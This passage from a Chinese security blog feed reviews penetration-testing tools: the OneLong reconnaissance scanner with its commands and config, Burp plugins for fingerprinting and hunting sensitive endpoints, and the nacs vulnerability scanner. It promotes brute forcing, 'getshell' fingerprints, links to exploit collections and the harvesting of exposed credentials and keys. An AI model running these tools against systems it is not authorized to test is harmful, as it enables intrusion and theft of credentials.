href="http://127.0.0.1:7890/">http://127.0.0.1:7890</a></strong></em></li></ul><p>2、根据企业域名去进行信息搜集</p><ul><li><em><strong>OneLong -d target.com -proxy=<a href="http://127.0.0.1:7890/">http://127.0.0.1:7890</a></strong></em></li></ul><p>3、批量域名信息搜集</p><ul><li><em><strong>OneLong -f file.txt -proxy=<a href="http://127.0.0.1:7890/">http://127.0.0.1:7890</a></strong></em></li></ul><p>4、如果目标企业存在安全设备，并且IP资源不多的话，可以只进行被动扫描，不进行子域名以及端口爆破，不进行漏洞扫描</p><ul><li><em><strong>OneLong -d target.com/-n 企业名称 -low -proxy=<a href="http://127.0.0.1:7890/">http://127.0.0.1:7890</a></strong></em></li></ul><h2 id="0x03、参数讲解"><a href="#0x03、参数讲解" class="headerlink" title="0x03、参数讲解"></a>0x03、参数讲解</h2><p>默认就是上面的三种方式进行使用 <em><strong>-d</strong></em> <em><strong>-f</strong></em> <em><strong>-n</strong></em></p><p>有一些相关企业的参数需要结合 <em><strong>-n</strong></em> 使用有 <em><strong>-deep</strong></em> <em><strong>-invest</strong></em> <em><strong>-is-branch</strong></em> 这些参数必须先使用***-n***</p><p><em><strong>-low</strong></em> ：使用这个参数就相当于同时使用 <em><strong>-nport</strong></em> <em><strong>-npoc</strong></em> <em><strong>-nbao</strong></em> 只进行被动API进行扫描</p><p><em><strong>-o</strong></em>：设置输出Excel的文件夹，最后输出的excel回保存到这个参数重</p><p><em><strong>-p</strong></em>：进行端口爆破的时候指定的端口，代码中内置了三种<em><strong>“–top-ports 1000”</strong></em> <em><strong>“–top-ports 100”</strong></em> <em><strong>“–top-ports 10”</strong></em> 默认爆破top 1000</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">-d string</span><br><span class="line">  域名</span><br><span class="line">-deep int</span><br><span class="line">  递归搜索n层公司 (default 5)</span><br><span class="line">-delay int</span><br><span class="line">  填写最大延迟时间（秒）将会在1-n间随机延迟</span><br><span class="line">-f string</span><br><span class="line">  批量扫描</span><br><span class="line">-invest float</span><br><span class="line">  投资比例  (default 70)</span><br><span class="line">-is-branch</span><br><span class="line">  深度查询分支机构信息（数量巨大），默认不查询</span><br><span class="line">-low</span><br><span class="line">  只进行被动扫描，不进行子域名以及端口爆破，不进行漏洞扫描</span><br><span class="line">-n string</span><br><span class="line">  企业关键词 eg 百度</span><br><span class="line">-nbao</span><br><span class="line">  不进行爆破子域名</span><br><span class="line">-npoc</span><br><span class="line">  不进行漏洞扫描</span><br><span class="line">-nport</span><br><span class="line">  不进行爆破端口</span><br><span class="line">-o string</span><br><span class="line">  结果输出的文件夹位置(可选)</span><br><span class="line">-p string</span><br><span class="line">  端口爆破默认为Top1000，还可修改为100或者10 (default "--top-ports 1000")</span><br><span class="line">-proxy string</span><br><span class="line">  设置代理例如:-proxy=http://127.0.0.1:7897</span><br><span class="line">-timeout int</span><br><span class="line">  每个请求默认1（分钟）超时 (default 1)</span><br></pre></td></tr></tbody></table></figure><p><a href="https://github.com/M0nster3/OneLong/blob/main/Images/long.jpeg"><img src="https://github.com/M0nster3/OneLong/raw/main/Images/long.jpeg" alt="login"></a></p><h2 id="0x04、相关配置文件解读"><a href="#0x04、相关配置文件解读" class="headerlink" title="0x04、相关配置文件解读"></a>0x04、相关配置文件解读</h2><h3 id="子域名相关配置文件"><a href="#子域名相关配置文件" class="headerlink" title="子域名相关配置文件"></a>子域名相关配置文件</h3><ul><li><em><strong>OneLong -n 企业名称</strong></em> 在使用这种方式的时候必须添加Aiqicha或者是TYC的token，否则不能正常使用，因为这个流程是需要这两个api去查询相应的备案号，然后才能进行后续的资产收集</li><li><em><strong>OneLong -d target.com</strong></em> 在使用这种方式因为工具里面带了一些不需要key的api，所以可以直接跑。</li></ul><p>想要搜集的信息更加全面，可以添加相应的API，添加的API不含直接收费的，都是一些免费的和一些有免费次数的</p><p><a href="https://app.binaryedge.io/account/api">binaryedge</a> , <a href="https://fullhunt.io/user/settings/">fullhunt</a> , <a href="https://hunter.qianxin.com/home/myInfo">qaxhunter</a> , <a href="https://bevigil.com/osint/api-keys">bevigil</a> , <a href="https://search.censys.io/account/api">CensysToken/CensysSecret</a> , <a href="https://www.zoomeye.org/profile">zomeye</a> , <a href="https://user.whoisxmlapi.com/products">whoisxmlapi</a> , <a href="https://www.virustotal.com/gui/user/M0nster3/apikey">virustotal</a> , <a href="https://account.shodan.io/">shodan</a> , <a href="https://chaos.projectdiscovery.io/#/">chaos</a> , <a href="https://leakix.net/settings/api">leakix</a> , <a href="https://app.netlas.io/profile/">netlax</a> , <a href="https://quake.360.net/quake/#/personal?tab=message">quake</a> , <a href="https://developers.google.com/custom-search/v1/overview#search_engine_id">googleid</a> , <a href="https://developers.google.com/custom-search/v1/overview#api_key">googleapi</a> , <a href="https://fofa.info/userInfo">fofakey/fofaEmail</a> , <a href="https://github.com/settings/tokens">githubtoken</a> ,</p><p><a href="https://securitytrails.com/app/auth/login?return=/app/account">securitytrails</a>:这个需要企业邮箱注册，可以去网上找一个免费注册一些比如<a href="https://mailh.qiye.163.com/">网易</a> ,</p><p><a href="https://www.racent.com/">racent</a>:抓包获取数据包里面的token</p><p><a href="https://aiqicha.baidu.com/">Aiqicha</a>：Cookie信息请勿直接 <code>document.cookie</code>，可能因为http-only 选项无法复制全导致登陆失败</p><p><a href="https://github.com/M0nster3/OneLong/blob/main/Images/image-20221028223835307.png"><img src="https://github.com/M0nster3/OneLong/raw/main/Images/image-20221028223835307.png" alt="login"></a></p><p><a href="https://www.aldzs.com/">阿拉丁</a>:点击任意请求，拿到请求里的TOKEN</p><p><a href="https://github.com/M0nster3/OneLong/blob/main/Images/image-20230709132223242.png"><img src="https://github.com/M0nster3/OneLong/raw/main/Images/image-20230709132223242.png" alt="login"></a></p><p><a href="https://www.tianyancha.com/">TYC tycid</a>:配置COOKIE后配置tycid,这里的cookie也是个Aiqicha一样那样直接从数据包中获取</p><p><a href="https://www.qimai.cn/">Qimai</a>:登陆账号然后把数据包里面的PHPSESSID提取出来就可以，这个也是点击任意链接都可以</p><p><a href="https://github.com/M0nster3/OneLong/blob/main/Images/20240401153609.png"><img src="https://github.com/M0nster3/OneLong/raw/main/Images/20240401153609.png" alt="login"></a></p><h3 id="MassDns模块"><a href="#MassDns模块" class="headerlink" title="MassDns模块"></a><a href="https://github.com/blechschmidt/massdns">MassDns模块</a></h3><p>注意：Releases中的文件夹名称不能更换</p><p>工具中的爆破主要是引用了MassDns爆破工具，作者称无需特殊配置，MassDNS 就能够使用公开可用的解析器每秒解析超过 350,000 个名称。是一个高效的爆破工具，</p><ul><li>resolvers: Releases中有一个Script/MassDns/resolvers.txt文件夹名称添加进去，如果更换了resolvers.txt,必须放在当前文件夹只需要把名称换了即可</li><li>wordlist：爆破的目录文件，项目中的爆破文件都在这个目录下Script\Dict，</li><li>massdnsPath:将Script/MassDns下的MassDns应用程序名称添加进来，如果是Linux的则需要把MassDns.exe改为相应的名称</li></ul><h3 id="Email模块"><a href="#Email模块" class="headerlink" title="Email模块"></a>Email模块</h3><p>最好设置 <a href="https://github.com/settings/tokens">githubtoken</a> 这里的Email也会调用这个Cookie里面的token，github搜索效果比较好</p><p><a href="https://hunter.io/">emailhunter</a> , <a href="https://intelx.io/">intelxEmail</a> , <a href="https://tomba.io/">tombaKey/tombaSecret</a></p><h3 id="Port模块"><a href="#Port模块" class="headerlink" title="Port模块"></a>Port模块</h3><p><em><strong>masscanpath</strong></em>: Masscan工具放的位置如果是在环境变量中则默认就行，比如kali之类的 <em><strong>rate</strong></em>: Masscan速率，速率如果太大很有可能直接带宽占满 <em><strong>nmappath</strong></em>: Nmap工具放的位置如果是在环境变量中则默认就行</p><h3 id="Afrog"><a href="#Afrog" class="headerlink" title="Afrog"></a><a href="https://github.com/zan8in/afrog">Afrog</a></h3><p>这个主要还是参考官方网站配置即可</p><h4 id="ceye"><a href="#ceye" class="headerlink" title="ceye"></a>ceye</h4><ul><li>访问<a href="http://ceye.io/">ceye.io</a>网站并注册一个帐户。</li><li>登录并进入个人设置页面。</li><li>复制<code>domain</code>和<code>api-key</code>并在文件中正确配置它们。</li></ul><h4 id="Dnslogcn"><a href="#Dnslogcn" class="headerlink" title="Dnslogcn"></a>Dnslogcn</h4><ul><li>无需配置，但 <a href="http://dnslog.cn/">dnslog.cn不稳定</a></li></ul><h4 id="Alphalog"><a href="#Alphalog" class="headerlink" title="Alphalog"></a>Alphalog</h4><ul><li>需要构建服务 <a href="https://github.com/AlphabugX/Alphalog">alphalog</a></li></ul><h4 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h4><ul><li>需要搭建 <a href="https://docs.xray.cool/tools/xray/advanced/reverse">xray服务</a></li></ul><h3 id="相关目录介绍"><a href="#相关目录介绍" class="headerlink" title="相关目录介绍"></a>相关目录介绍</h3><p>目前是有四种目录， AfrogAddPoc:这个目录主要是里面如果添加一些Afrog工具的一些自动POC,可以放到这个文件夹，工具会自动识别</p><p>Dict：这个里面现在是放了两个文件一个是Login.txt 这个主要就是在进行查找后台路径的时候，对路径的一些匹配，另一个是一个子域名目录文件，在进行MassDns爆破的时候加载的字典。</p><p>Ehole：这和里面主要放的是在进行url访问，进行一些高危漏洞以及CMS进行指纹识别的规则。</p><p>MassDns：这个里面主要就是放MassDns进行爆破的应用程序和所需要的resolvers文件。</p><p><a href="https://github.com/M0nster3/OneLong/blob/main/Images/20240401165726.png"><img src="https://github.com/M0nster3/OneLong/raw/main/Images/20240401165726.png" alt="login"></a></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Utils:</span><br><span class="line">  output: ""            # 导出文件位置</span><br><span class="line">cookies:</span><br><span class="line">  aiqicha: ''           # 爱企查   Cookie</span><br><span class="line">  tianyancha: ''        # 天眼查   Cookie</span><br><span class="line">  tycid: ''        # 天眼查   CApi ID(capi.tianyancha.com)</span><br><span class="line">  aldzs: ''             # 阿拉丁   TOKEN(see README)</span><br><span class="line">  qimai: ''             # 七麦数据  Cookie</span><br><span class="line">  binaryedge: ''# binaryedge  Cookie 免费查询250次</span><br><span class="line">  fullhunt: ''# Fullhunt Cookie 威胁平台 每月免费100次</span><br><span class="line">  hunter: ''# Hunter Cookie 威胁平台 每日免费500个数据</span><br><span class="line">  bevigil: ''           # Bevigil Cookie 威胁平台 每月免费50次</span><br><span class="line">  CensysToken: ''       # Censys Token 威胁平台 每月免费250次</span><br><span class="line">  CensysSecret: ''      # Censys Secret 威胁平台 每月免费250次</span><br><span class="line">  zoomeye: ''# ZooEye Cookie 每月1000条</span><br><span class="line">  whoisxmlapi: ''# whoisxmlapi Cookie 免费500次</span><br><span class="line">  virustotal: ''        # virustotal Cookie 每分钟4次 每天500次</span><br><span class="line">  shodan: ''# shodan Cookie </span><br><span class="line">  chaos: ''# chaos Key</span><br><span class="line">  leakix: ''# leakix Key</span><br><span class="line">  netlas: ''# Netlas key</span><br><span class="line">  quake: ''# Quake key</span><br><span class="line">  securitytrails: ''# securitytrails 需要企业邮箱，每个月50次</span><br><span class="line">  googleid: ''# google id 免费的API只能查询前100条结果,每天免费提供 100 次搜索查询</span><br><span class="line">  googleapi: ''# google Api 免费的API只能查询前100条结果,每天免费提供 100 次搜索查询</span><br><span class="line">  fofaKey: ''# Fofa key</span><br><span class="line">  fofaEmail: ''# Fofa Email</span><br><span class="line">  githubtoken: ''# Github Token </span><br><span class="line">  racent: ''# racent Token</span><br><span class="line">massdns:</span><br><span class="line">  resolvers: 'resolvers.txt'# resolvers 文件名称</span><br><span class="line">  wordlist: 'names.txt'# 子域名爆破文件名称</span><br><span class="line">  massdnsPath: 'massdns.exe'# Massdns工具名称</span><br><span class="line">email:</span><br><span class="line">  emailhunter: ''# Email hunter Token</span><br><span class="line">  intelxEmail: ''# Email Intelx Token</span><br><span class="line">  tombaKey: ''# Email tombaKey</span><br><span class="line">  tombaSecret: ''# Email tombaSecret</span><br><span class="line">port:</span><br><span class="line">  masscan:</span><br><span class="line">    masscanpath: 'masscan'    # Masscan放的位置如果是在环境变量中则默认就行</span><br><span class="line">    rate: 5000 # Masscan速率，速率如果太大很有可能直接带宽占满</span><br><span class="line">  nmappath: 'nmap'</span><br><span class="line">#Afrog配置</span><br><span class="line">reverse:</span><br><span class="line">  alphalog:</span><br><span class="line">    domain: ""</span><br><span class="line">    api_url: ""</span><br><span class="line">  ceye:</span><br><span class="line">    api-key: ""</span><br><span class="line">    domain: ""</span><br><span class="line">  dnslogcn:</span><br><span class="line">    domain: dnslog.cn</span><br><span class="line">  xray:</span><br><span class="line">    x_token: ""</span><br><span class="line">    domain: ""</span><br><span class="line">    api_url: http://x.x.x.x:8777</span><br></pre></td></tr></tbody></table></figure><h2 id="0x05、效果图"><a href="#0x05、效果图" class="headerlink" title="0x05、效果图"></a>0x05、效果图</h2><p><a href="https://github.com/M0nster3/OneLong/blob/main/Images/1711968305378.png"><img src="https://github.com/M0nster3/OneLong/raw/main/Images/1711968305378.png" alt="login"></a></p><p><a href="https://github.com/M0nster3/OneLong/blob/main/Images/1711968416627.png"><img src="https://github.com/M0nster3/OneLong/raw/main/Images/1711968416627.png" alt="login"></a></p><p><a href="https://github.com/M0nster3/OneLong/blob/main/Images/1711968830642.png"><img src="https://github.com/M0nster3/OneLong/raw/main/Images/1711968830642.png" alt="login"></a></p><h2 id="0x06、参考"><a href="#0x06、参考" class="headerlink" title="0x06、参考"></a>0x06、参考</h2><p><a href="https://github.com/wgpsec/ENScan_GO">ENScan_GO</a></p><p><a href="https://github.com/hanc00l/nemo_go">nemo_go</a></p><p><a href="https://github.com/shmilylty/OneForAll">Oneforall</a></p><p><a href="https://github.com/0x727/ShuiZe_0x727">Shuize</a></p><p><a href="https://github.com/lc/gau">gau</a></p><p><a href="https://github.com/projectdiscovery/subfinder">subfinder</a></p><p><a href="https://github.com/EdgeSecurityTeam/EHole">Ehole</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>56-虚拟数据生成</title>
      <link href="/2024/05/08/56-%E8%99%9A%E6%8B%9F%E6%95%B0%E6%8D%AE%E7%94%9F%E6%88%90/"/>
      <url>/2024/05/08/56-%E8%99%9A%E6%8B%9F%E6%95%B0%E6%8D%AE%E7%94%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<h1 id="工具简介"><a href="#工具简介" class="headerlink" title="工具简介"></a>工具简介</h1><p>生成虚拟的身份证号码\手机号\银行卡\地址\姓名\邮箱等.</p><p>工具:utools</p><p>​数据模拟插件</p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>55-指纹扫描-burp插件</title>
      <link href="/2024/05/06/55-%E6%8C%87%E7%BA%B9%E6%89%AB%E6%8F%8F-burp%E6%8F%92%E4%BB%B6/"/>
      <url>/2024/05/06/55-%E6%8C%87%E7%BA%B9%E6%89%AB%E6%8F%8F-burp%E6%8F%92%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Burp-指纹识别"><a href="#Burp-指纹识别" class="headerlink" title="Burp 指纹识别"></a>Burp 指纹识别</h1><p>下载链接:<a href="https://github.com/shuanx/BurpFingerPrint/releases/download/v1.5/BurpFingerPrint.jar">https://github.com/shuanx/BurpFingerPrint/releases/download/v1.5/BurpFingerPrint.jar</a></p><p><a href="https://camo.githubusercontent.com/aec62dc0b68de45205213e0a66854fd631127f8745f8a42d6340d3028a2cd8f7/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f417574686f722d536861756e2d626c7565"><img src="https://camo.githubusercontent.com/aec62dc0b68de45205213e0a66854fd631127f8745f8a42d6340d3028a2cd8f7/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f417574686f722d536861756e2d626c7565" alt="img"></a> <a href="https://camo.githubusercontent.com/a0f773456863099bcf616a51290c7ea9df5f80dad5116aa42793f3f8cffd5ef7/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4a444b2d392b2d79656c6c6f77"><img src="https://camo.githubusercontent.com/a0f773456863099bcf616a51290c7ea9df5f80dad5116aa42793f3f8cffd5ef7/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4a444b2d392b2d79656c6c6f77" alt="img"></a> <a href="https://camo.githubusercontent.com/58e5f7dfab13434e66cf8dc2eb3c2c17e8ef39e24748293fad85aba83a4be899/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2545362538442541312545362542432538462545362539382541462545392539372541382545382538392542412545362539432541462d2545352542452538302545352542452538302545362539432538392545362538342538462545362538332542332545342542382538442545352538382542302545372539412538342545362538382539302545362539452539432d726564"><img src="https://camo.githubusercontent.com/58e5f7dfab13434e66cf8dc2eb3c2c17e8ef39e24748293fad85aba83a4be899/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2545362538442541312545362542432538462545362539382541462545392539372541382545382538392542412545362539432541462d2545352542452538302545352542452538302545362539432538392545362538342538462545362538332542332545342542382538442545352538382542302545372539412538342545362538382539302545362539452539432d726564" alt="img"></a></p><blockquote><p>攻击过程中，我们通常会用浏览器访问一些资产，该BurpSuite插件实现被动指纹识别+网站提取链接+OA爆破，可帮助我们发现更多资产。</p></blockquote><h2 id="功能如下"><a href="#功能如下" class="headerlink" title="功能如下"></a>功能如下</h2><blockquote><p>下述功能会在2024年5月底完成，如果有更好的建议都可以提，然后再麻烦点个Star，创作不易，打造最强指纹识别库和弱口令探测库</p></blockquote><ul><li>浏览器被动指纹识别，已集成Ehole指纹识别库</li><li>提取网站的URL链接和解析JS文件中的URL链接后进行指纹识别</li><li>开界面进行指纹库修改，可导入、导出、重置</li><li>优化已有指纹库，区分重点指纹和常见指纹，补充部分实战热门漏洞的指纹，方便直接一键getshell <a href="https://github.com/shuanx/BurpFingerPrint/blob/main/images/importantFinger.png"><img src="https://github.com/shuanx/BurpFingerPrint/raw/main/images/importantFinger.png" alt="img.png"></a></li><li>优化算法，提升性能、减少内存开销</li><li>使用sqlite存储扫描结果，放置因BurpSuite意外退出而导致数据丢失</li><li>收集github上常见的EXP工具，提起其含有EXP漏洞的指纹，当成重要指纹，一旦页面出现该指纹，就表示有戏有戏</li><li>1、<a href="https://github.com/R4gd0ll/I-Wanna-Get-All">https://github.com/R4gd0ll/I-Wanna-Get-All</a></li><li>2、<a href="https://github.com/YinWC/2021hvv_vul">https://github.com/YinWC/2021hvv_vul</a></li><li>3、<a href="https://github.com/zhzyker/vulmap">https://github.com/zhzyker/vulmap</a></li><li>4、<a href="https://github.com/SecWiki/CMS-Hunter">https://github.com/SecWiki/CMS-Hunter</a></li><li>5、<a href="https://github.com/coffeehb/Some-PoC-oR-ExP">https://github.com/coffeehb/Some-PoC-oR-ExP</a></li><li>6、<a href="https://github.com/White-hua/Apt_t00ls">https://github.com/White-hua/Apt_t00ls</a></li><li>7、<a href="https://github.com/biggerwing/nsfocus-rsas-knowledge-base">https://github.com/biggerwing/nsfocus-rsas-knowledge-base</a></li><li>优化GUI，指纹识别出来后，可以快速查看对应的利用EXP的github地址</li><li>OA类弱口令爆破</li><li>与本地Packer Fuzzer JS扫描器配合发现隐秘漏洞</li></ul><h2 id="支持检测指纹"><a href="#支持检测指纹" class="headerlink" title="支持检测指纹"></a>支持检测指纹</h2><ul><li>通达OA</li><li>致远OA</li><li>蓝凌OA</li><li>泛微OA</li><li>万户OA</li><li>东华OA</li><li>信呼OA</li><li>等等</li></ul><h2 id="支持弱口令爆破组件"><a href="#支持弱口令爆破组件" class="headerlink" title="支持弱口令爆破组件"></a>支持弱口令爆破组件</h2><ul><li>Apache Tomcat</li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
          <category> burp插件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>54-敏感信息收集-burp插件</title>
      <link href="/2024/05/05/54-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-burp%E6%8F%92%E4%BB%B6/"/>
      <url>/2024/05/05/54-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-burp%E6%8F%92%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="BurpAPI查找器"><a href="#BurpAPI查找器" class="headerlink" title="BurpAPI查找器"></a>BurpAPI查找器</h1><p>下载链接:<a href="https://github.com/shuanx/BurpAPIFinder/releases/download/v1.7/BurpAPIFinder.jar">https://github.com/shuanx/BurpAPIFinder/releases/download/v1.7/BurpAPIFinder.jar</a></p><p><a href="https://camo.githubusercontent.com/aec62dc0b68de45205213e0a66854fd631127f8745f8a42d6340d3028a2cd8f7/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f417574686f722d536861756e2d626c7565"><img src="https://camo.githubusercontent.com/aec62dc0b68de45205213e0a66854fd631127f8745f8a42d6340d3028a2cd8f7/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f417574686f722d536861756e2d626c7565" alt="img"></a> <a href="https://camo.githubusercontent.com/a0f773456863099bcf616a51290c7ea9df5f80dad5116aa42793f3f8cffd5ef7/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4a444b2d392b2d79656c6c6f77"><img src="https://camo.githubusercontent.com/a0f773456863099bcf616a51290c7ea9df5f80dad5116aa42793f3f8cffd5ef7/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4a444b2d392b2d79656c6c6f77" alt="img"></a> <a href="https://camo.githubusercontent.com/58e5f7dfab13434e66cf8dc2eb3c2c17e8ef39e24748293fad85aba83a4be899/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2545362538442541312545362542432538462545362539382541462545392539372541382545382538392542412545362539432541462d2545352542452538302545352542452538302545362539432538392545362538342538462545362538332542332545342542382538442545352538382542302545372539412538342545362538382539302545362539452539432d726564"><img src="https://camo.githubusercontent.com/58e5f7dfab13434e66cf8dc2eb3c2c17e8ef39e24748293fad85aba83a4be899/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2545362538442541312545362542432538462545362539382541462545392539372541382545382538392542412545362539432541462d2545352542452538302545352542452538302545362539432538392545362538342538462545362538332542332545342542382538442545352538382542302545372539412538342545362538382539302545362539452539432d726564" alt="img"></a></p><blockquote><p>在攻防演练过程中，我们通常会使用浏览器访问一些资产，但很多未授权/敏感信息/越权隐匿在访问接口过html、JS文件等，通过该Burp插件我们可以：<br>1、通过某些接口可以发现进行未授权/越权获取到所有的账号密码、私钥、凭证<br>2、发现通过某接口可以枚举用户信息、修改密码、用户创建接口<br>3、发现登陆后台网址<br>4、发现在html、JS中漏洞账号密码或者云主机的Access Key和SecretKey<br>…</p></blockquote><p><a href="https://github.com/shuanx/BurpAPIFinder/blob/main/images/main.png"><img src="https://github.com/shuanx/BurpAPIFinder/raw/main/images/main.png" alt="图片.png"></a></p><h2 id="功能如下"><a href="#功能如下" class="headerlink" title="功能如下"></a>功能如下</h2><blockquote><p>如果有更好的建议或者期待使用的，点个免费的星星</p></blockquote><ul><li>网站提取的URL链接并解析JS文件中的URL链接</li><li>前段界面可自行定义铭感关键词、敏感url匹配</li><li>界面可配置的开启主动探测探测、铭感信息获取</li><li>集成主题攻防场景敏感信息的指纹库<br><a href="https://github.com/shuanx/BurpAPIFinder/blob/main/images/config.png"><img src="https://github.com/shuanx/BurpAPIFinder/raw/main/images/config.png" alt="图片.png"></a></li><li>集成HaE的敏感信息识别指纹<br><a href="https://github.com/shuanx/BurpAPIFinder/blob/main/images/HaE.png"><img src="https://github.com/shuanx/BurpAPIFinder/raw/main/images/HaE.png" alt="图片.png"></a></li><li>集成APIKit的敏感信息识别指纹<br><a href="https://github.com/shuanx/BurpAPIFinder/blob/main/images/APIKit.png"><img src="https://github.com/shuanx/BurpAPIFinder/raw/main/images/APIKit.png" alt="图片.png"></a></li><li>集成红薯的敏感信息识别指纹<br><a href="https://github.com/shuanx/BurpAPIFinder/blob/main/images/sweetPotato.png"><img src="https://github.com/shuanx/BurpAPIFinder/raw/main/images/sweetPotato.png" alt="图片.png"></a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
          <category> burp插件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>53-nacs-自动扫描并且利用漏洞</title>
      <link href="/2024/05/01/53-nacs-%E8%87%AA%E5%8A%A8%E6%89%AB%E6%8F%8F%E5%B9%B6%E4%B8%94%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/05/01/53-nacs-%E8%87%AA%E5%8A%A8%E6%89%AB%E6%8F%8F%E5%B9%B6%E4%B8%94%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="nacs-事件驱动的扫描器"><a href="#nacs-事件驱动的扫描器" class="headerlink" title="nacs 事件驱动的扫描器"></a>nacs 事件驱动的扫描器</h1><p>github:<a href="https://github.com/u21h2/nacs">https://github.com/u21h2/nacs</a></p><p>下载链接:<a href="https://github.com/u21h2/nacs/releases/tag/0.0.4">https://github.com/u21h2/nacs/releases/tag/0.0.4</a></p><p>[<a href="https://github.com/u21h2/nacs/blob/main/README.md">中文自述]</a> | [<a href="https://github.com/u21h2/nacs/blob/main/README_EN.md">英文自述文件]</a></p><p><a href="https://github.com/u21h2/nacs"><img src="https://camo.githubusercontent.com/3ec3266145c2f5f5b9eeecdeee15398f69fffe59d87cb53043aa3ec2f5aba0c1/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f676f2d6d6f642f676f2d76657273696f6e2f75323168322f6e6163733f66696c656e616d653d676f2e6d6f64" alt="发布"></a> <a href="https://github.com/u21h2/nacs"><img src="https://camo.githubusercontent.com/6847718f24bd6b0de661635fef3bb95d170dcf748f85d38def9bc280bc15f4e4/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6e6163732d302e302e342d666636396234" alt="发布"></a> <a href="https://github.com/u21h2/nacs/releases"><img src="https://camo.githubusercontent.com/42dde9b88cc4ed858ff81187d443213d08910c2178c924988e82749cccf30074/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f646f776e6c6f6164732f75323168322f6e6163732f746f74616c" alt="img"></a> <a href="https://github.com/u21h2/nacs"><img src="https://camo.githubusercontent.com/e7a05da50fc9b9c1fa905d506a3d7078c798cd05c2859cfdece0a8e4c9f25d0c/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f666f726b732f75323168322f6e616373" alt="img"></a></p><h2 id="✨-功能"><a href="#✨-功能" class="headerlink" title="✨ 功能"></a>✨ 功能</h2><ul><li>探活</li><li>服务扫描(常规&amp;非常规则端口)</li><li>poc探测(xray&amp;nuclei格式)</li><li>数据库等弱口令爆破</li><li>内网常见漏洞利用</li></ul><h2 id="⭐️亮点"><a href="#⭐️亮点" class="headerlink" title="⭐️亮点"></a>⭐️亮点</h2><ul><li>常见组件及常见HTTP请求头的log4j漏洞检测 <a href="https://github.com/u21h2/nacs/blob/main/utils/3.png"><img src="https://github.com/u21h2/nacs/raw/main/utils/3.png" alt="图像"></a></li><li>非常规范端口的服务扫描和使用（比如2222端口的ssh等等）</li><li>识别为公网IP时，从fofa搜索可用的资产作为扫描的补充（正在写）</li><li>自动识别简单web页面的输入框，用于弱口令爆破及log4j的检测(正在写)</li></ul><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span 